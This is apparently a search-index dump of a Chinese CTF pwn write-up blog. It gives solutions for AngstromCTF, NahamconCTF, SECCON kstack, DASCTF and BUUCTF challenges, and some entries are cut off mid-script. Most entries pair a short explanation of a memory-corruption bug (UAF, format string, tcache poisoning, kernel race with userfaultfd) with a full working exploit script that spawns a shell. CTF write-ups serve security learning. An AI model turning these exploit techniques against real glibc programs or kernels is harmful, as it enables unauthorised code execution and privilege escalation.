muney","uri":"/zh-cn/2022-06-18-glibcheap-house-of-muney/"},{"categories":["pwn-wp"],"content":"2022-AngstromCTF-Pwn-Wp\r记录wp。 AngstromCTF-Parity\r解题思路\r限制了输入的shellcode，字节必须依次偶数、奇数、偶数、奇数…… 最有效的方式是在shellcode里面构造read，然后输入第二段shellcode，这样第一段shellcode就只需要很短即可。小技巧是偶数用\\x90填充，奇数可选用\\xfd也就是std指令填充。 多次尝试后，写出如下exp。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from audioop import byteswap from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] \"\"\" 4c 87 e2 xchg rdx,r12 \"\"\" shellcode = \"\"\" push 0x040f040f pop rbx lea rcx, [rdx] std mov [rcx+0x30], bl std xchg rdx,r12 \"\"\" data = asm(shellcode) data += b\"\\xfd\\x90\"*0x10 + b\"\\x05\\x90\"*8 for i, c in enumerate(data): if i \u0026 1 != c \u0026 1: log_ex(list(bytearray(data))) errlog_exit(\"wrong shellcode!\") io.sendafter(\"\u003e \", data, timeout=10) sleep(2) s(b\"\\x90\"*0x50 + ShellcodeMall.amd64.execve_bin_sh) ia() AngstromCTF-Dreams\r解题思路\r常规的UAF，首先修改max_dream这个变量，然后泄露出libc，打__free_hook即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def add(idx, date=\"deadbee\\n\", dream=\"cafebeef\"): sla(\"\u003e \", \"1\") sla(\"In which page of your mind do you keep this dream? \", str(idx)) sa(\"What's the date (mm/dd/yy))? \", date) sa(\"what did you dream about? \", dream) def delete(idx): sla(\"\u003e \", \"2\") sla(\"Which one are you trading in? \", str(idx)) def edit(idx, date): sla(\"\u003e \", \"3\") sla(\"What dream is giving you trouble? \", str(idx)) ru(\"Hmm... I see. It looks like your dream is telling you that \") m = rl() sa(\"New date: \", date) log_ex(f\"get msg: {m}\") return m add(0) add(1) delete(1) delete(0) edit(0, p64(0x404000)) add(2) add(3,dream=b\"a\"*8+p64_ex(0x0101010101010101)) m = edit(3, \"deadbeef\") libc_base = u64_ex(m[-7:-1]) - libc.sym._IO_2_1_stdout_ set_current_libc_base_and_log(libc_base, 0) add(4) delete(4) delete(0) edit(0, p64(libc.sym.__free_hook)) add(10, \"/bin/sh\\n\") add(11, p64(libc.sym.system)) delete(10) ia() Caniride\r解题思路\r漏洞有两个地方，第一个地方可以泄露程序基地址，第二个可以格式化字符串攻击。 注意，第一个使用的占位符是%s，也就是说得在程序段上找到一个指针，指向一个程序段或libc的地址；如果直接去泄露got表，输出的其实是指令…… 找到这个地方，一个指向自己的指针： 因为泄露后还有第二次输入的机会，所以就可以在第二次输入的时候输入地址。 接下来的思路就是： printf attack修改.finit_array的第一个元素为main函数地址；同时，泄露出libc的地址 第二次执行main函数，利用printf attack修改exit@got为add rsp; 0x98; ret这个gadget的地址 然后执行rop即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] sla(\"Name: \", \"%105c%16$hhndeadbeef%143$p\\n\") sla(\"Pick your driver: \", \"-3\") ru(\"Hi, this is \") m = ru(\" \") code_base = u64_ex(m[:-1]) - 0x35a8 set_current_code_base_and_log(code_base, 0) sa(\"So... tell me a little about yourself: \", p64_ex(code_base + 0x3300)) ru(\"deadbeef\") m = rl() libc_base = int16_ex(m[:-2]) - libc.sym.__libc_start_main - 243 set_current_libc_base_and_log(libc_base, 0) og = CurrentGadgets.find_gadget(\"add rsp, 0x98; ret;\") h1 = (og \u0026 0xffffff) \u003e\u003e 16 l2 = og \u0026 0xffff sla(\"Name: \", f\"%{h1}c%16$hhn%{l2-h1}c%17$hn\") sla(\"Pick your driver: \", \"1\") layout = [ elf.got.exit + 2, # exit@got elf.got.exit, [CurrentGadgets.ret()]*0x20, CurrentGadgets.pop_rdi_ret(), CurrentGadgets.bin_sh(), libc.sym.system ] sa(\"So... tell me a little about yourself: \", flat(layout)) ia() 远程： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-30","objectID":"/zh-cn/2022-04-30-angstromctf-pwn/:0:0","tags":["pwn"],"title":"2022-angstromCTF-pwn","uri":"/zh-cn/2022-04-30-angstromctf-pwn/"},{"categories":["pwn-wp"],"content":"2022-NahamconCTF-Pwn\r记录下wp。 NahamconCTF-Stackless\r解题思路\r也是一道shellcode题，开启了沙箱： 执行shellcode的时候所有的寄存器都变成了0： 最后也执行了xor r15, r15，还把页权限改为了read|exec，也就是不可write 读取flag需要一个可读可写的地址，当前可用的地址又不能写，所以只能猜测一个可读可写的地址，步骤如下： rsi赋值为0x7f0000000000 开始循环，每次rsi += 0x100000，然后尝试write(1, rsi, 0x30)，然后判断rax是否为负数，如果是负数，继续循环 当结束上面的循环的时候，说明我们找到了libc的地址空间，但是可读不一定可写 所以开启新的循环，用read(0, rsi, 1)去找一个可写的区域，然后判断rax，这里每次rsi += 0x1000 找到可写的段后，开始open read write即可 比较坑的是，路径为/home/challenge/flag.txt EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] sla(\"Shellcode length\\n\", str(0x400)) # 利用write的返回值和read的返回值判断是否找到一个可读可写的段 shellcode = \"\"\" mov edi, 1 mov rsi, 0x7f0000000000 mov edx, 0x30 L1: add rsi, 0x100000 mov eax, 1 syscall test eax, eax jng L1 xor edi, edi mov edx, 1 L2: add rsi, 0x1000 xor eax, eax syscall test eax, eax jng L2 add rsi, 0x18 mov rsp, rsi mov rax, 0x7478742e67616c66 push rax mov rax, 0x2f65676e656c6c61 push rax mov rax, 0x68632f656d6f682f push rax mov rax, 0 mov [rsp+0x18], rax mov rdi, rsp xor esi, esi xor edx, edx mov eax, 2 syscall mov edi, eax xor eax, eax mov edx, 0x30 mov rsi, rsp syscall mov edi, 1 mov eax, 1 syscall \"\"\" data = asm(shellcode) + ShellcodeMall.amd64.cat_flag sa(\"Shellcode\\n\", data) sleep(3) s(\"\\x90\"*0x1000) ia() NahamconCTF-Reading_list\r解题思路\r有个格式化字符串的洞 是一个堆上的格式化字符串。解题思路如下： 泄露libc，pie和栈地址、堆地址 在栈上找一个链，修改booklist为可控的堆地址 构造overlapped chunk，利用tcache bin poisoning分配到__free_hook上 这里有个坑点是getline每次malloc似乎都是固定大小，之后会realloc调整堆 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from socket import timeout from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] context.update(timeout=5) def show_list(n): sla(\"\u003e \", \"1\") m = rs(n) log_ex(f\"msg: {m}\") return m def add(name): sla(\"\u003e \", \"2\") sla(\"Enter the book name: \", name) def remove(idx): sla(\"\u003e \", \"3\") sla(\": \", str(idx)) def change(name): sla(\"\u003e \", \"4\") sla(\"What is your name: \", name) sla(\"What is your name: \", \"roderick\") add(\"%6$p,%7$p,%23$p\") m = show_list(2) m = (m[1][3:]).split(b\",\") print(m) code_base = int16_ex(m[0]) -0x11c0 stack_addr = int16_ex(m[1]) libc_base = int16_ex(m[2]) - libc.sym[\"__libc_start_main\"] - 243 log_code_base_addr(code_base) log_address(\"stack_addr\", stack_addr) log_libc_base_addr(libc_base) for i in range(0x10): add(\"deadbeef\") for i in range(0x10): remove(1) hook_addr = code_base + 0x4030 gadget_addr = libc_base + 0x00000000001518b0 target_stack_addr = stack_addr + 0x68 # 25 53 add(f\"%{target_stack_addr \u0026 0xffff}c%25$hn\") show_list(1) add(f\"%{hook_addr \u0026 0xffff}c%53$hn\") show_list(1) for i in range(1): target_stack_addr += 2 hook_addr \u003e\u003e= 16 add(f\"%{target_stack_addr \u0026 0xffff}c%25$hn\") show_list(1) add(f\"%{hook_addr \u0026 0xffff}c%53$hn\") show_list(1) add(\"cafebeef%27$s\") show_list(1) ru(\"cafebeef\") m = rs(2)[0] heap_base = u64_ex(m) - 0x860 log_heap_base_addr(heap_base) add(p64_ex(heap_base + 0xa90)*8) heap_addr = heap_base + 0x340 add(f\"%{heap_addr \u0026 0xffff}c%27$hn\".ljust(0x10, \"a\").encode() + cyclic(0x60)) show_list(1) add(\"a\"*0x70) add(flat({0x58:0x81}, length=0x70)) add(\"c\"*0x70) add(\"d\"*0x70) add(\"e\"*0x70) remove(10) remove(10) remove(1) add(flat({0x20:libc_base + libc.sym.__free_hook}, length=0x70)) add(\"/bin/sh;\".ljust(0x70, \"a\")) add(p64(libc.sym.system + libc_base)*0xe) remove(12) ia() NahamconCTF-Free_real_estate\r解题思路\r有个UAF 结构体信息为： struct Prop{ void * _1; void * _2; float price; size_t house_number; char* street_name; size_t * street_length; char * comment; size_t comment_length; }; EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def show(): sla(\"\u003e \", \"1\") def add(hn=1, sn=0x10, name=\"cafebeef\", cn=0x10, a=\"y\", c=\"deadbeef\"): sla(\"\u003e \", \"2\") sla(\"Enter the house number: \", str(hn)) sla(\"What is the length of the street name: \", str(sn)) sla(\"Enter the street name: \", name) sla(\"What is the price of t","date":"2022-04-30","objectID":"/zh-cn/2022-04-30-nahamconctf-pwn/:0:0","tags":["pwn"],"title":"2022-nahamconCTF-pwn","uri":"/zh-cn/2022-04-30-nahamconctf-pwn/"},{"categories":["pwn-wp"],"content":"总结\r这题有点迷，按照我的理解，开启了kpti并不会影响将内核栈迁移到用户态空间并调用内核态函数，实际上我栈迁移之后调用函数会莫名其妙的挂死。后来搜索了一下错误，发现和kvm有关系，索性不使用kvm，改了下启动选项为qemu64,+smep。 开启KPTI之后哪怕关掉了smap/smep，由于页表不同，仍然无法调用用户态的函数 可以使用swapgs_restore_regs_and_return_to_usermode 这个函数切换页表，并完美返回用户态；或者引发段错误，并为SIGSEGV信号注册get_shell函数，仍然可以获取到root权限的shell 如果能rop的话，不一定非得要root shell，直接修改modprobe_path或者core_pattern即可 题目分析\r这里是题目链接，提供了源码及题目附件。 启动脚本： #!/bin/sh qemu-system-x86_64 \\ -m 512M \\ -kernel ./bzImage \\ -initrd ./rootfs.cpio \\ -append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet\" \\ -cpu kvm64,+smep \\ -net user -net nic -device e1000 \\ -monitor /dev/null \\ -nographic 开启了kaslr/smep，然后启动后查看/proc/cpuinfo，发现默认开启了kpti： 然后分析一下题目。 发现实现了一个栈操作，但是push的时候，首先对head赋值了，然后赋值出现错误才恢复head，因此可以造成条件竞争。 利用思路\r由于分配的是kmalloc-32，并且只能写8字节，所以考虑劫持seq_operations结构体，该结构体的start函数指针可以通过以下方式触发： int fd = open(\"/proc/self/stat\", 0); read(fd, buffer, 0); 此外，通过userfaultfd机制，大大提高利用成功的机率。利用步骤分为两步： 1、泄露kernel基地址 首先分配一定数量的seq_operations结构体，然后都释放掉。这样，除了前8个字节，其余的函数指针并不会被清空。然后，与kstack驱动交互，插入一个node，在拷贝用户态的数据的时候卡住，并在userfaultfd处理线程中将其释放掉，这样就读取了8字节的脏数据，多次尝试后发现该地址与kernel base的偏移是固定的，因此可以泄露出内核的基地址。 2、劫持seq_operations结构体的start函数指针 首先push一个node，然后pop node，并在pop的时候卡住，在userfaultfd线程中先执行1次open(\"/proc/self/stat\", 0)进行占位，然后再次pop node，这样操作之后即可构造UAF修改函数指针。然后，利用setxattr将这个chunk占住，并篡改前8个字节，然后在userfaultfd中调用read(fd, buf, 0)触发start函数指针。利用pt_regs结构体进行栈迁移，将栈迁移到用户态后，利用rop修改modprobe_path变量，指向用户定义的一个shell脚本，然后执行一个非法格式的elf文件即可触发脚本调用。 EXP\r#include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003cstdint.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e #include \u003cstdarg.h\u003e #include \u003cstropts.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/stat.h\u003e #include \u003csys/mman.h\u003e #include \u003cpoll.h\u003e #include \u003cassert.h\u003e #include \u003csyscall.h\u003e #include \u003cpthread.h\u003e #include \u003clinux/fs.h\u003e #include \u003clinux/fuse.h\u003e #include \u003clinux/sched.h\u003e #include \u003clinux/if_ether.h\u003e #include \u003clinux/userfaultfd.h\u003e #include \u003csys/shm.h\u003e #include \u003csys/msg.h\u003e #include \u003csys/ipc.h\u003e #include \u003csys/ioctl.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #include \u003csys/syscall.h\u003e #include \u003cctype.h\u003e // data size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags; size_t g_prepare_kernel_cred_addr, g_commit_creds_addr; size_t g_vmlinux_base_addr; size_t *g_buffer; size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi; ssize_t g_process_userfault_running; #define G_BUFFER_SIZE 0x100000 #define PAGE_SIZE 0x1000 /* extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags; extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr; extern size_t g_vmlinux_base_addr; extern size_t *g_buffer; extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi; extern ssize_t g_process_userfault_running; */ #define RAW_VMLINUX_BASE_ADDR 0xffffffff81000000 #define GADGETS_OFFSET (g_vmlinux_base_addr - RAW_VMLINUX_BASE_ADDR) #define GET_GADGET_REAL_ADDR(x) (x + GADGETS_OFFSET) void __attribute__((constructor)) initial() { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); g_buffer = (size_t *)calloc(G_BUFFER_SIZE, 1); } void __attribute__((destructor)) finish() { free(g_buffer); } void clear_buffer() { if (g_buffer) { memset(g_buffer, G_BUFFER_SIZE, 0); } } void info(const char *fmt, ...) { va_list arg; int done; char s[0x1000] = {0}; va_start(arg, fmt); done = vsprintf(s, fmt, arg); va_end(arg); printf(\"[\\033[40;33m*\\033[0m] \\033[40;33mINFO\\033[0m ===\u003e %s\\r\\n\", s); } void success(const char *fmt, ...) { va_list arg; int done; char s[0x1000] = {0}; va_start(arg, fmt); done = vsprintf(s, fmt, arg); va_end(arg); printf(\"[\\033[40;32m+\\033[0m] \\033[40;32mOJBK\\033[0m ===\u003e %s\\r\\n\", s); } void fail(const char *fmt, ...) { va_list arg; int done; char s[0x1000] = {0}; va_start(arg, fmt); done = vsprintf(s, fmt, arg); va_end(arg); printf(\"[\\033[40;31m-\\033[0m] \\033[40;31mFAIL\\033[0m ===\u003e %s\\r\\n\", s); } void warn(const char *fmt, ...) { va_list arg; int done; char s[0x1000] = {0}; va_start(arg, fmt); done = vsprintf(s, f","date":"2022-04-28","objectID":"/zh-cn/2022-04-28-seccon-2020-kstack/:0:0","tags":["pwn"],"title":"seccon-2020-kstack","uri":"/zh-cn/2022-04-28-seccon-2020-kstack/"},{"categories":["pwn-wp"],"content":"2022DASCTF-Apr-X-FATE-Pwn-Wp\r时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病……一言难尽。下来把剩下几道题都复现一遍，wp持续更新中已写完收工。 小广告：解题脚本均使用我自己开发的工具pwncli编写，欢迎感兴趣的pwner师傅们试用~ 1 Good_luck\r眼疾手快拿了个一血，这题其实很简单，但是远程的问题很大。附件都更新了两次，就很迷~ Checksec\r没有给libc。 漏洞点\r要么栈溢出+格式化字符串，要么栈溢出： 利用思路\r由于这两种的概率是1/2，所以可以根据不同的输出来使用不同的payload。当然，可以编写一个通用的payload同时适用这两种情况。 观察到fmt函数的缓冲区距离rbp是0x70，overflow函数的缓冲区距离rbp是0x50，所以前面的通用的payload可以为： layoud = { 0x58: [ret_addr] * 4 0x78: \"deadbeef\" } 因此，思路为： 使用通用payload再次执行fmt 第一次fmt，利用格式化字符串泄露出libc地址，并再次执行fmt 根据泄露出来的地址，计算并填入one_gadget即可获得shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] ru(\"good luck\\n\") m = rl() data = flat([ \"a\" * 0x58, p64(CurrentGadgets.ret()) * 5, elf.sym.fmt ]) sl(data) ru(\"fmt\\n\") data = flat({ 0: \"%7$s\", 8: elf.got.puts, 0x58: [ p64(CurrentGadgets.ret()) * 5, elf.sym.fmt ] }) sl(data) puts_addr = recv_current_libc_addr(offset=0) log_address(\"puts addr: \", puts_addr) lb = LibcBox() lb.add_symbol('puts', puts_addr) lb.search(download_so=1) # download --\u003e libc6_2.23-0ubuntu11.2_amd64.so libc_base = puts_addr - lb.dump('puts') system_adddr = libc_base + lb.dump('system') bin_sh = libc_base + lb.dump('str_bin_sh') set_current_libc_base_and_log(libc_base, 0) ru(\"fmt\\n\") data = flat({ 0x78: [ 0x4527a + libc_base, # one_gadget [0] * 0x20 ] }) sl(data) ia() 最后测出来远程：libc6_2.23-0ubuntu11.2_amd64。 远程： 2 Ssstring\r不得不说，这次比赛的远程真的很很很很迷，本地环境应该和远程是一样的，但是总是打一半就卡死崩掉了。 这题考查的是C++的string对象，也不算很难的题。C++ string对象的布局伪代码： struct string { char *data; int capacity; int refcount; char pad[0x10]; }; 初始状态下，data指针指向pad处。如果输入的字符串长度大于0x10，string对象的操作流程可以简单总结为： 首先检查data是不是指向pad，如果是，就会调用malloc分配堆内存，存储输入的字符串 如果data不指向pad： 如果输入的字符串长度大于capacity，释放data处的内存 按照0x40-\u003e0x80-\u003e0xf0-\u003e0x1e0-\u003e0x3e0...的大小依次进行扩容，直到满足要求（所以一次性读取超过0x400长度的字符串，会在tcachebins里面发现很多free chunk） Checksec\r远程libc版本为：2.31-0ubuntu9.2_amd64 漏洞点\r程序不复杂，漏洞也很明显，在change idx的时候： 输入的idx可以为负数，也就可以溢出修改capacity域以及data指针，虽然每次只能修改1个字节。 利用思路\r根据漏洞点整理利用思路如下： 第一次输入不超过0x10长度的字符串 利用索引负数溢出修改掉capacity的值后，cout\u003c\u003cstr即可泄露出栈上的libc地址以及栈地址 继续利用溢出修改capacity大于0x7f000000 然后将data指向的地址的第5个字节修改成libc地址的第5个字节。比如说此时data的地址是一个栈地址0x7ffdd10d5e90，泄露出来的libc地址0x7f7463afc000，这里将0x7ffdd10d5e90修改为0x7f74d10d5e90，是为了方便修改libc上的数据 计算想要修改的libc上的数据，和修改后的data之间的距离，一个字节一个字节修改即可 这里我选择的思路是修改IO_file_jumps结构体和stdout结构体以及__free_hook，篡改puts的调用链，使得_IO_file_xsputn调用_IO_str_finish，调用free(stdout-\u003e_IO_buf_base)，实际调用system(\"\\nsh;\")即可获得shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from socket import timeout from pwncli import * cli_script() context.update(timeout=5) io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def input_str(data): sla(\"\u003e\u003e \", \"1\") sla(\"string? \\n\", data) def change(idx, c): sla(\"\u003e\u003e \", \"2\") sla(\"char idx? \\n\", str(idx)) sa(\"char? \\n\", c) def show(): sla(\"\u003e\u003e \", \"3\") input_str(\"deadbeef\") change(-7, '\\x01') show() m = ru(\"1. Cin\") libc_base = u64(m[0x40:0x40+8]) - libc.sym.__libc_start_main - 243 set_current_libc_base_and_log(libc_base, 0) free_hook_addr = libc.sym.__free_hook system_addr = libc.sym.system file_jump_addr = libc_base + 0x1ed4a0 stdout_addr = libc.sym._IO_2_1_stdout_ IO_str_finish = libc_base + 0x96ed0 stack_addr = u64_ex(m[0x50:0x50+8]) string_ptr = stack_addr - 0x128 log_address(\"string_ptr\", string_ptr) input_str(\"/bin/sh;deadbee\") change(-5, '\\x7f') change(-12, p8_ex(libc_base \u003e\u003e 32)) string_ptr = (string_ptr \u0026 0xffffffff) | ((libc_base \u003e\u003e 32) \u003c\u003c 32) # write IO_str_finish target_addr = file_jump_addr write_content = IO_str_finish dis = target_addr - string_ptr log_ex(f\"current distance: {dis}\") assert dis \u003e -0x80000000 and dis \u003c 0x7fffffff, \"try again\" for i in range(6): change(dis + i, p8_ex(write_content)) write_content \u003e\u003e= 8 # write system target_addr = free_hook_addr write_content = system_addr dis = target_addr - string_ptr log_ex(f\"current distance: {dis}\") assert dis \u003e -0x80000000 and dis \u003c 0x7fffffff, \"try again\" for i in range(6): change(dis + i, p8_ex(write_content)) write_content \u003e\u003e= ","date":"2022-04-23","objectID":"/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/:0:0","tags":["pwn"],"title":"2022DASCTF-Apr-X-FATE-pwn-wp","uri":"/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/"},{"categories":["pwn-wp"],"content":"简介\rbuuctf-pwn-wp合集 Shanghai2019_slient_note\rChecksec\r远程为libc-2.27.so 利用思路\r固定分配0x208和0x28，且使用calloc，也就是不会从tcache bins里面取chunk。刚开始想用fastbin attack，发现没有合适的大小的chunk可以使用，使用改用unlink。 利用过程： 依次分配0x208和0x28 释放8次0x210大小的chunk，就得到一个unsortedbin chunk 继续分配0x28大小，这时候会切割unsortedbin chunk，这样往large ptr指向的内存写的时候，就可以修改small ptr指向的chunk 伪造chunk，触发unlink leak addr然后修改got表即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] small = 1 large = 2 def add(t, data=\"deadbeef\", add_lf=True): sla(\"Exit\\n\", \"1\") sla(\"add?\\n\", str(t)) if add_lf: sla(\"Content:\\n\", data) else: sa(\"Content:\\n\", data) def delete(t): sla(\"Exit\\n\", \"2\") sla(\"delete?\\n\", str(t)) def update(t, data=\"deadbeef\", add_lf=True): sla(\"Exit\\n\", \"3\") sla(\"update?\\n\", str(t)) if add_lf: sla(\"Content:\\n\", data) else: sa(\"Content:\\n\", data) # prepare for unlink add(large, flat({ 0xb0:[ 0, 0x21, 0, 0 ] * 3 })) add(small) # make an unsortedbin chunk for _ in range(8): delete(large) # overlap add(small) add(small) # overwrite update(large, flat([ 0, 0x21, 0x6020d8-0x18, 0x6020d8-0x10, 0x20, 0x90 ])) # unlink for i in range(8): delete(small) update(large, flat([ \"/bin/sh\\x00\", 0, elf.got.free, elf.got.setvbuf ])) # write free@got update(small, p64(elf.plt.puts)) # leak libc addr delete(large) set_current_libc_base_and_log(addr=recv_current_libc_addr(), offset=libc.sym.setvbuf) update(small, p64(libc.sym.system)) update(large, \"/bin/sh\") delete(2) sleep(1) sl(\"cat flag\") ia() 远程打： Httc_tjctf_2016\r这一题远程好像打不通，估计远程没有/home/app/web这个目录。变量未初始化的漏洞有时候确实有点难发现……对这类漏洞感觉还是不是很敏感。 漏洞点\r找了半天，后来动态调试的时候才发现漏洞。变量未初始的漏洞，导致字符串拼接，可以读取flag。 也就是说，当把url填满0x32的时候，由于没有添加\\x00结束符，filename还会继续往后拼接，直到0x64处为\\x00。那么用gdb动调以下： 由此，根据偏移，写出exp即可。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] payload = \"GET\" + \" \" # method payload += \"//\" + \"./\" * 24 + \" \" # url payload += \"a\" * 9 + \"\\n\" # version payload += cyclic(50).decode() + \": \" payload += \"X\"*33 + \"../../../flag\\x00\" + \"\\n\\n\" s(payload) ia() 泄露出flag： Whctf2017_rc4\r漏洞点\r在generate_key函数中，如果选择不为a或者b，就有一个变量位未初始化的漏洞： 然而，每次的key都会打印出来： 还有一个栈溢出： 利用思路\r利用未初始化的漏洞泄露出canary 栈溢出执行rop EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] # generate key sla(\"\u003e \", \"a\") sla(\"\u003e \", \"b\") # leave canary on stack sla(\"\u003e \", \"b\") sl(\"deadbeef\") # leak canary sla(\"\u003e \", \"a\") sla(\"\u003e \", \"f\") m = rl() canary = bytes.fromhex(m[-17:-1].decode()) canary = int.from_bytes(canary, \"little\") log_address(\"canary\", canary) read_input_addr = 0x400d37 data = flat({ 0x108: canary, 0x118:[ CurrentGadgets.pop_rdi_ret(), elf.got.puts, elf.plt.puts, CurrentGadgets.pop_rdi_ret(), elf.got.rand, CurrentGadgets.pop_rsi_r15_ret(), 0x20, 0, read_input_addr, CurrentGadgets.pop_rdi_ret(), elf.got.rand+8, elf.plt.rand ] }) sla(\"\u003e \", \"b\") sl(data) sla(\"\u003e \", \"d\") sl(\"n\") set_current_libc_base_and_log(recv_current_libc_addr(), offset=libc.sym.puts) sl(p64_ex(libc.sym.system) + b\"/bin/sh;\") sleep(0.5) sl(\"cat /flag\") ia() 远程打： Inndy_fast\r就是除法用python写的会有点问题，写个程序调用一下即可，其他的都可以用python解决。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] sla(\"game.\\n\", \"Yes I know\") res = [] calc = process(\"./calc\") for i in range(10000): m = rl() n1, op, n2, *_ = m.split() n1 = int_ex(n1) n2 = int_ex(n2) op = op.decode() if op == \"+\": tmp = n1 + n2 elif op == \"-\": tmp = n1 - n2 elif op == \"*\": tmp = n1 * n2 elif op == \"/\": calc.sendlineafter(\"code: \", f\"{n1} {op} {n2}\") calc.recvuntil(\"The result: \") tmp = calc.recvline() tmp = int_ex(tmp) res.append(tmp) continue else: error(\"WHF!\") tmp \u0026= 0xffffffff if tmp \u003e= 0x7fffffff: tmp -= (1 \u003c\u003c 32) res.append(tmp) calc.sendlineafter(\"code: \\n\", \"quit\") calc.close() for x in res: sl(str(x)) ia() 然后辅助的calc.c： // gcc calc.c -o calc #incl","date":"2022-04-15","objectID":"/zh-cn/2022-04-15-buuctf-pwn-tasks-20/:0:0","tags":["pwn"],"title":"BUUCTF-pwn合集","uri":"/zh-cn/2022-04-15-buuctf-pwn-tasks-20/"},{"categories":["pwn-wp"],"content":"总结\r虽然对输入的rop中的字节是随机交换，但是由于循环的边界在栈上，所以可以把前面一大段都写为0，这样某一次交换就会把循环边界置为0，跳出循环，不会影响后面的rop。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] bss_addr = elf.bss(0x800) s(b\"\\x00\" * 0x60 + flat({ 8:[ bss_addr, 0x804865c, # read 80 bytes 0x804867d, # leave; ret bss_addr ] }, length=0x20)) # leak addr s(flat( [ bss_addr + 0x100, # fake ebp elf.plt.write, 0x804879d, # pppr 1, elf.got.read, 4, 0x804865c, # read 80 bytes 0, bss_addr ] )) set_current_libc_base_and_log(recv_current_libc_addr(offset=libc.sym.read), 0) s(flat({ 28: [ libc.sym.system, 'dead', libc.search(b\"/bin/sh\").__next__() ] })) ia() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-04-11","objectID":"/zh-cn/2022-04-11-buuctf-inndy-rsbo/:0:0","tags":["pwn"],"title":"BUUCTF-inndy_rsbo","uri":"/zh-cn/2022-04-11-buuctf-inndy-rsbo/"},{"categories":["pwn-wp"],"content":"总结\r考察strsep函数，查看其源码可知，该函数签名为：char * __strsep (char **stringp, const char *delim)，其中*stringp这个字符串会被修改。每当*stringp所指向的字符串含有分割符的时候，会将此处置为\\0。也就是说，会改变原有字符串的值（可以执行某一位置置为\\0）。 Checksec\r远程为libc-2.23.so。 漏洞点\r漏洞点在strsep函数： char * __strsep (char **stringp, const char *delim) { char *begin, *end; begin = *stringp; if (begin == NULL) return NULL; /* Find the end of the token. */ end = begin + strcspn (begin, delim); if (*end) { /* Terminate the token and set *STRINGP past NUL character. */ *end++ = '\\0'; // 这里会置为\\0 *stringp = end; } else /* No more delimiters; this is the last token. */ *stringp = NULL; return begin; } 对*end指向的内容有修改。 这里拷贝结束后，刚好挨着rbp寄存器指向的值。 利用思路\r利用strncpy输入0x400个字节即可泄露出rbp存储的栈地址 将分隔符设置为泄露出的栈地址的最后一个字节，如为0xf0，就设置分割字符串为\"\\xf0\\x00\"，这样就会修改rbp链的值 函数返回的时候，由于leave; ret，实际返回到栈的低地址处，这就到了输入的可控空间，需要注意的是，泄露出栈地址的最后一个字节一定是0x?0，有16中可能，每一种最后需要控制的偏移都不一样，但是有规律，总结后发现：当最后一个字节为0xf0的时候，需要控制的偏移处为0x330；当最后一个字节为0xe0的时候，需要控制的偏移为0x340……当最后一个字节为0x30的时候，需要控制的偏移为0x3f0。也就是说，如果泄露出来的栈地址的最后一个字节为0xf0，填入的payload应该为：a * 0x330 + rbp + ret + ······ 我选择爆破最后一个字节为0xb0，输入rop链（rop中的\\x00都可以用\\xb0代替，这样在strsep的时候，就把这些\\xb0给置为\\x00了），rop链分别调用stdout泄露出glibc地址，然后伪造一个std::string对象，往bss段上输入，最后栈迁移到bss然后调用gets继续输入，执行mprotect+shellcode EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] payload = b\"a\"*0x370 fake_rbp = 0x404280 val = 0xb0 payload += p32_ex(fake_rbp+0x20)[:3]+p8(val) * 5 payload += 